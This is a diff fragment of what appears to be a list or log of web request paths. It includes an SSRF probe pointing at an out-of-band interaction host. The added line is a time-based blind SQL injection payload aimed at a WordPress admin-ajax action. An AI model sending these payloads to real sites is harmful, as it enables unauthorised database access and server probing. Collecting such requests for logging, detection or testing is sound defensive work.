@@ -9649,3 +9649,4 @@ a
 /archive/download?file=http://ctu1e2la6l84rsl142k0omxsxidmwdxtn.oast.live/
 /wp-login.php?wlcms-action=preview
 /?gad_source=5&gclid=EAIaIQobChMIipD_vv3kigMV4o6sAh0blzzyEAEYASAAEgKKkPD_BwE
+/wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition
